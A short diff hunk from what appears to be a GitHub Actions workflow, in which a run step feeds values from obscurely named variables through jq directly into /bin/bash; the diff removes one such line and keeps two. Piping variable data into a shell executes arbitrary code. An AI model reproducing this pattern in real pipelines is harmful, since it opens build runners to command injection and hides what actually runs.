@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$hqs243" | jq -r .ucrd19503 | /bin/bash
           echo $yv6084 | jq -r .mug311 | /bin/bash
-          printf '%s' "$s22" | jq -r .ecr4 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
